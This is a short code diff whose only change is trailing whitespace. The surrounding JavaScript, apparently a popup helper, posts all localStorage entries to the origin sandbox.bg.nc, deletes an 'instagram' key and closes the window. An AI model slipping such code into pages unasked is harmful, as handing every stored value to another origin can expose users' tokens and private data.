@@ -29,7 +29,7 @@
          window.close()
       }
       window.addEventListener('storage', () => { 
-         window_ref.postMessage(Object.entries(localStorage), "https://sandbox.bg.nc")
+         window_ref.postMessage(Object.entries(localStorage), "https://sandbox.bg.nc") 
          localStorage.removeItem("instagram");
          window.close()
       })
